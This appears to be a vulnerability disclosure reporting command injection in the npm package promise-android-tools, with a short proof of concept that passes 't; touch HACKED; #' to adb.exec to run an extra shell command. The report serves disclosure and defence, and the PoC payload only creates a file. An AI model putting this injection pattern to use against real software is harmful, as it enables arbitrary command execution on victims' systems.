# :bug: Description

The `promise-android-tools` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executedading to `arbitrary command injection`

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
const { Adb, Fastboot } = require("promise-android-tools");
const adb = new Adb();
adb.exec('t; touch HACKED; #');

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i promise-android-tools # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
